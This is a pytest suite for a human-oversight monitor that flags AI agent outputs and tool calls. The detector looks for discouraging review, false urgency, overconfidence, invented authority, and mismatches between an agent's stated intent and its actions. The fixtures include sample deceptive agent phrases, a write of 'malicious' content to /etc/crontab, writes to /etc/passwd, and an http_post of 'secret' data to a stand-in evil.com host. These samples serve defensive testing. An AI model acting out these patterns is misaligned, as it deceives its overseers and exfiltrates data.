"""Tests for src/aiaf/analysis/human_oversight_monitor.py."""

import pytest
from aiaf.analysis.human_oversight_monitor import (
    create_oversight_session,
    get_oversight_session,
    record_agent_output,
    record_tool_call,
    assess_session,
    close_session,
    list_at_risk_sessions,
    HUMAN_OVERSIGHT_VERSION,
    EVENT_AGENT_OUTPUT,
    EVENT_TOOL_CALL,
    SIGNAL_CONSENT_MISMATCH,
    SIGNAL_OVERSIGHT_SUPPRESSION,
    SIGNAL_URGENCY_MANUFACTURE,
    SIGNAL_CONFIDENCE_INFLATION,
    SIGNAL_AUTHORITY_FABRICATION,
    RISK_SAFE,
    RISK_ELEVATED,
    RISK_HIGH,
    RISK_CRITICAL,
    SESSION_ACTIVE,
    SESSION_CLOSED,
    HumanOversightError,
)


# ── Minimal fake store ────────────────────────────────────────────────────────

class _Store:
    def __init__(self):
        self._data = {}

    def get_model(self, key):
        return self._data.get(key)

    def save_model(self, record):
        key = record.get("model_id") or record.get("id")
        self._data[key] = record

    def list_models(self):
        return list(self._data.values())


# ── create_oversight_session ──────────────────────────────────────────────────

class TestCreateOversightSession:
    def test_returns_dict(self):
        store = _Store()
        result = create_oversight_session("s1", "agent-a", store)
        assert isinstance(result, dict)

    def test_session_id_stored(self):
        store = _Store()
        result = create_oversight_session("s1", "agent-a", store)
        assert result["session_id"] == "s1"

    def test_agent_id_stored(self):
        store = _Store()
        result = create_oversight_session("s1", "agent-a", store)
        assert result["agent_id"] == "agent-a"

    def test_default_status_active(self):
        store = _Store()
        result = create_oversight_session("s1", "agent-a", store)
        assert result["status"] == SESSION_ACTIVE

    def test_initial_risk_safe(self):
        store = _Store()
        result = create_oversight_session("s1", "agent-a", store)
        assert result["risk_level"] == RISK_SAFE

    def test_principal_id_stored(self):
        store = _Store()
        result = create_oversight_session("s1", "agent-a", store, principal_id="user-1")
        assert result["principal_id"] == "user-1"

    def test_known_principals_stored(self):
        store = _Store()
        result = create_oversight_session("s1", "agent-a", store,
                                          known_principals=["alice", "bob"])
        assert "alice" in result["known_principals"]

    def test_context_stored(self):
        store = _Store()
        result = create_oversight_session("s1", "agent-a", store,
                                          context="Deploy pipeline task")
        assert result["context"] == "Deploy pipeline task"

    def test_evidence_origin(self):
        store = _Store()
        result = create_oversight_session("s1", "agent-a", store)
        assert result["evidence_origin"] == "LOCALLY_OBSERVED"

    def test_created_at_present(self):
        store = _Store()
        result = create_oversight_session("s1", "agent-a", store)
        assert result["created_at"].endswith("Z")

    def test_duplicate_session_raises(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        with pytest.raises(HumanOversightError):
            create_oversight_session("s1", "agent-a", store)

    def test_empty_session_id_raises(self):
        store = _Store()
        with pytest.raises(HumanOversightError):
            create_oversight_session("", "agent-a", store)

    def test_empty_agent_id_raises(self):
        store = _Store()
        with pytest.raises(HumanOversightError):
            create_oversight_session("s1", "", store)


# ── get_oversight_session ─────────────────────────────────────────────────────

class TestGetOversightSession:
    def test_returns_none_if_not_found(self):
        store = _Store()
        assert get_oversight_session("no-such-session", store) is None

    def test_returns_session_after_creation(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = get_oversight_session("s1", store)
        assert result is not None
        assert result["session_id"] == "s1"


# ── record_agent_output — basic ───────────────────────────────────────────────

class TestRecordAgentOutput:
    def test_returns_dict(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_agent_output("s1", "I will fetch the report.", store)
        assert isinstance(result, dict)

    def test_event_type(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_agent_output("s1", "Fetching data.", store)
        assert result["event_type"] == EVENT_AGENT_OUTPUT

    def test_text_stored(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_agent_output("s1", "Hello world.", store)
        assert result["text"] == "Hello world."

    def test_clean_output_no_signals(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_agent_output("s1", "I will retrieve the quarterly report for review.", store)
        assert result["signals"] == []

    def test_session_not_found_raises(self):
        store = _Store()
        with pytest.raises(HumanOversightError):
            record_agent_output("no-such", "text", store)

    def test_closed_session_raises(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        close_session("s1", store)
        with pytest.raises(HumanOversightError):
            record_agent_output("s1", "text", store)

    def test_turn_id_stored(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_agent_output("s1", "text", store, turn_id="turn-42")
        assert result["turn_id"] == "turn-42"

    def test_evidence_origin(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_agent_output("s1", "text", store)
        assert result["evidence_origin"] == "LOCALLY_OBSERVED"


# ── Signal: OVERSIGHT_SUPPRESSION ─────────────────────────────────────────────

class TestOversightSuppression:
    def test_no_need_to_review(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_agent_output(
            "s1", "This is a routine step. No need to review the output.", store
        )
        signals = {s["signal"] for s in result["signals"]}
        assert SIGNAL_OVERSIGHT_SUPPRESSION in signals

    def test_already_approved(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_agent_output(
            "s1", "This action was previously approved — proceed without review.", store
        )
        signals = {s["signal"] for s in result["signals"]}
        assert SIGNAL_OVERSIGHT_SUPPRESSION in signals

    def test_trust_me(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_agent_output("s1", "Trust me, this output is correct.", store)
        signals = {s["signal"] for s in result["signals"]}
        assert SIGNAL_OVERSIGHT_SUPPRESSION in signals

    def test_no_action_needed(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_agent_output("s1", "No action needed from your side.", store)
        signals = {s["signal"] for s in result["signals"]}
        assert SIGNAL_OVERSIGHT_SUPPRESSION in signals

    def test_skip_review(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_agent_output(
            "s1", "You can skip the review for this step.", store
        )
        signals = {s["signal"] for s in result["signals"]}
        assert SIGNAL_OVERSIGHT_SUPPRESSION in signals

    def test_suppression_severity_high_for_hard_patterns(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_agent_output(
            "s1", "No need to review this output, already approved.", store
        )
        high_suppression = [
            s for s in result["signals"]
            if s["signal"] == SIGNAL_OVERSIGHT_SUPPRESSION and s["severity"] == "HIGH"
        ]
        assert len(high_suppression) > 0


# ── Signal: URGENCY_MANUFACTURE ───────────────────────────────────────────────

class TestUrgencyManufacture:
    def test_immediately(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_agent_output(
            "s1", "We need to execute this immediately or the data will be lost.", store
        )
        signals = {s["signal"] for s in result["signals"]}
        assert SIGNAL_URGENCY_MANUFACTURE in signals

    def test_deadline_expires(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_agent_output(
            "s1", "The deadline expires today. We must act now.", store
        )
        signals = {s["signal"] for s in result["signals"]}
        assert SIGNAL_URGENCY_MANUFACTURE in signals

    def test_before_too_late(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_agent_output(
            "s1", "Please approve before it's too late.", store
        )
        signals = {s["signal"] for s in result["signals"]}
        assert SIGNAL_URGENCY_MANUFACTURE in signals

    def test_urgent(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_agent_output(
            "s1", "This is urgent — the window is closing soon.", store
        )
        signals = {s["signal"] for s in result["signals"]}
        assert SIGNAL_URGENCY_MANUFACTURE in signals

    def test_calm_text_no_urgency(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_agent_output(
            "s1", "I will schedule this task for tomorrow morning.", store
        )
        signals = {s["signal"] for s in result["signals"]}
        assert SIGNAL_URGENCY_MANUFACTURE not in signals


# ── Signal: CONFIDENCE_INFLATION ──────────────────────────────────────────────

class TestConfidenceInflation:
    def test_guaranteed(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_agent_output(
            "s1", "This is guaranteed to work correctly.", store
        )
        signals = {s["signal"] for s in result["signals"]}
        assert SIGNAL_CONFIDENCE_INFLATION in signals

    def test_100_percent_sure(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_agent_output(
            "s1", "I am 100% sure that this output is accurate.", store
        )
        signals = {s["signal"] for s in result["signals"]}
        assert SIGNAL_CONFIDENCE_INFLATION in signals

    def test_without_doubt(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_agent_output(
            "s1", "Without a doubt, this is the correct course of action.", store
        )
        signals = {s["signal"] for s in result["signals"]}
        assert SIGNAL_CONFIDENCE_INFLATION in signals

    def test_no_doubt(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_agent_output(
            "s1", "There is no doubt this will succeed.", store
        )
        signals = {s["signal"] for s in result["signals"]}
        assert SIGNAL_CONFIDENCE_INFLATION in signals

    def test_hedged_language_no_inflation(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_agent_output(
            "s1", "Based on the available evidence, this appears likely to be correct.", store
        )
        signals = {s["signal"] for s in result["signals"]}
        assert SIGNAL_CONFIDENCE_INFLATION not in signals


# ── Signal: AUTHORITY_FABRICATION ─────────────────────────────────────────────

class TestAuthorityFabrication:
    def test_authorized_by_pattern(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_agent_output(
            "s1", "This action is authorized by management.", store
        )
        signals = {s["signal"] for s in result["signals"]}
        assert SIGNAL_AUTHORITY_FABRICATION in signals

    def test_as_per_instructions(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_agent_output(
            "s1", "As per Alice's instructions, I will proceed with the deletion.", store
        )
        signals = {s["signal"] for s in result["signals"]}
        assert SIGNAL_AUTHORITY_FABRICATION in signals

    def test_boss_said(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_agent_output(
            "s1", "Your manager said to approve this immediately.", store
        )
        signals = {s["signal"] for s in result["signals"]}
        assert SIGNAL_AUTHORITY_FABRICATION in signals

    def test_on_behalf_of(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_agent_output(
            "s1", "I'm acting on behalf of the admin team.", store
        )
        signals = {s["signal"] for s in result["signals"]}
        assert SIGNAL_AUTHORITY_FABRICATION in signals

    def test_known_principal_softens_signal(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store,
                                  known_principals=["alice"])
        result = record_agent_output(
            "s1", "As per Alice's instructions, proceeding with the update.", store
        )
        auth_signals = [s for s in result["signals"]
                        if s["signal"] == SIGNAL_AUTHORITY_FABRICATION]
        if auth_signals:
            # Known principal → severity should be MEDIUM, not HIGH
            assert all(s["severity"] == "MEDIUM" for s in auth_signals)

    def test_unknown_principal_hardens_signal(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store,
                                  known_principals=["alice"])
        result = record_agent_output(
            "s1", "Authorized by management to proceed immediately.", store
        )
        auth_signals = [s for s in result["signals"]
                        if s["signal"] == SIGNAL_AUTHORITY_FABRICATION]
        # "management" not in known_principals → should be HIGH
        if auth_signals:
            assert any(s["severity"] == "HIGH" for s in auth_signals)


# ── Signal: CONSENT_MISMATCH (via record_tool_call) ──────────────────────────

class TestConsentMismatch:
    def test_read_write_mismatch(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_tool_call(
            "s1", "file.write",
            {"path": "/etc/crontab", "content": "malicious"},
            store,
            described_intent="I will read the configuration file to check its contents.",
        )
        signals = {s["signal"] for s in result["signals"]}
        assert SIGNAL_CONSENT_MISMATCH in signals

    def test_read_write_mismatch_severity_critical(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_tool_call(
            "s1", "file.write",
            {"path": "/tmp/output.txt", "content": "data"},
            store,
            described_intent="I will read the log to view today's errors.",
        )
        consent_signals = [s for s in result["signals"]
                           if s["signal"] == SIGNAL_CONSENT_MISMATCH]
        assert any(s["severity"] == "CRITICAL" for s in consent_signals)

    def test_scope_escalation(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        # described "the file" (single entity) but passed many values
        result = record_tool_call(
            "s1", "email.send",
            {"recipients": [f"user{i}@example.com" for i in range(10)],
             "subject": "Update",
             "body": "Hello"},
            store,
            described_intent="I will send a brief email to the user.",
        )
        signals = {s["signal"] for s in result["signals"]}
        assert SIGNAL_CONSENT_MISMATCH in signals

    def test_undisclosed_external_call(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_tool_call(
            "s1", "http_post",
            {"url": "https://external-server.evil.com/collect", "data": "secret"},
            store,
            described_intent="I will save the result to the local database.",
        )
        signals = {s["signal"] for s in result["signals"]}
        assert SIGNAL_CONSENT_MISMATCH in signals

    def test_matching_intent_no_mismatch(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_tool_call(
            "s1", "file.read",
            {"path": "/tmp/report.txt"},
            store,
            described_intent="I will read the report file to extract key metrics.",
        )
        consent_signals = [s for s in result["signals"]
                           if s["signal"] == SIGNAL_CONSENT_MISMATCH]
        assert len(consent_signals) == 0

    def test_no_described_intent_no_mismatch_check(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_tool_call(
            "s1", "file.write", {"path": "/tmp/out.txt"}, store
        )
        # Without described_intent, consent mismatch is not checked
        consent_signals = [s for s in result["signals"]
                           if s["signal"] == SIGNAL_CONSENT_MISMATCH]
        assert len(consent_signals) == 0

    def test_event_type_tool_call(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = record_tool_call("s1", "tool.read", {}, store)
        assert result["event_type"] == EVENT_TOOL_CALL

    def test_session_not_found_raises(self):
        store = _Store()
        with pytest.raises(HumanOversightError):
            record_tool_call("no-such", "tool.read", {}, store)


# ── assess_session ────────────────────────────────────────────────────────────

class TestAssessSession:
    def test_empty_session_safe(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = assess_session("s1", store)
        assert result["risk_level"] == RISK_SAFE
        assert result["total_signal_count"] == 0

    def test_result_keys(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = assess_session("s1", store)
        for key in ("session_id", "risk_level", "signals_by_type", "all_signals",
                    "event_count", "evidence_origin", "assessed_at"):
            assert key in result

    def test_medium_signal_elevates_risk(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        record_agent_output("s1", "This is a routine operation, trust me.", store)
        result = assess_session("s1", store)
        assert result["risk_level"] in (RISK_ELEVATED, RISK_HIGH)

    def test_critical_signal_elevates_to_critical(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        record_tool_call(
            "s1", "file.write", {"path": "/etc/passwd"},
            store,
            described_intent="I will read the user list to view current accounts.",
        )
        result = assess_session("s1", store)
        assert result["risk_level"] == RISK_CRITICAL

    def test_high_signal_elevates_to_high(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        record_agent_output("s1", "No need to review this — already approved.", store)
        result = assess_session("s1", store)
        assert result["risk_level"] in (RISK_HIGH, RISK_CRITICAL)

    def test_signals_by_type_grouped(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        record_agent_output("s1", "No need to review this step.", store)
        record_agent_output("s1", "Execute immediately, deadline expires today.", store)
        result = assess_session("s1", store)
        assert SIGNAL_OVERSIGHT_SUPPRESSION in result["signals_by_type"]
        assert SIGNAL_URGENCY_MANUFACTURE in result["signals_by_type"]

    def test_event_count(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        record_agent_output("s1", "Step 1.", store)
        record_agent_output("s1", "Step 2.", store)
        record_tool_call("s1", "tool.read", {}, store)
        result = assess_session("s1", store)
        assert result["event_count"] == 3

    def test_session_not_found_raises(self):
        store = _Store()
        with pytest.raises(HumanOversightError):
            assess_session("no-such", store)

    def test_evidence_origin(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = assess_session("s1", store)
        assert result["evidence_origin"] == "LOCALLY_OBSERVED"

    def test_assessed_at_utc(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = assess_session("s1", store)
        assert result["assessed_at"].endswith("Z")

    def test_multiple_signal_types_aggregated(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        record_agent_output("s1", "Trust me, this is guaranteed to be correct.", store)
        result = assess_session("s1", store)
        sig_types = set(result["signals_by_type"].keys())
        assert SIGNAL_OVERSIGHT_SUPPRESSION in sig_types or SIGNAL_CONFIDENCE_INFLATION in sig_types


# ── close_session ─────────────────────────────────────────────────────────────

class TestCloseSession:
    def test_sets_closed_status(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = close_session("s1", store)
        assert result["status"] == SESSION_CLOSED

    def test_closed_at_present(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = close_session("s1", store)
        assert "closed_at" in result

    def test_not_found_raises(self):
        store = _Store()
        with pytest.raises(HumanOversightError):
            close_session("no-such", store)

    def test_session_is_retrievable_after_close(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        close_session("s1", store)
        session = get_oversight_session("s1", store)
        assert session["status"] == SESSION_CLOSED


# ── list_at_risk_sessions ─────────────────────────────────────────────────────

class TestListAtRiskSessions:
    def test_empty_store(self):
        store = _Store()
        result = list_at_risk_sessions(store)
        assert isinstance(result, list)

    def test_safe_session_not_listed(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        result = list_at_risk_sessions(store)
        assert all(r["session_id"] != "s1" for r in result)

    def test_at_risk_session_listed(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        record_agent_output("s1", "No need to review — already approved.", store)
        assess_session("s1", store)  # pushes risk_level onto session record
        result = list_at_risk_sessions(store, min_risk=RISK_HIGH)
        session_ids = [r["session_id"] for r in result]
        assert "s1" in session_ids

    def test_sorted_by_risk_descending(self):
        store = _Store()
        create_oversight_session("s1", "agent-a", store)
        create_oversight_session("s2", "agent-b", store)
        # s2 gets CRITICAL
        record_tool_call(
            "s2", "file.write", {"path": "/etc/passwd"},
            store,
            described_intent="I will read the user list.",
        )
        assess_session("s2", store)
        # s1 stays SAFE
        results = list_at_risk_sessions(store, min_risk=RISK_ELEVATED)
        if len(results) >= 2:
            ranks = [{"SAFE": 0, "ELEVATED": 1, "HIGH": 2, "CRITICAL": 3}
                     .get(r["risk_level"], 0) for r in results]
            assert ranks == sorted(ranks, reverse=True)
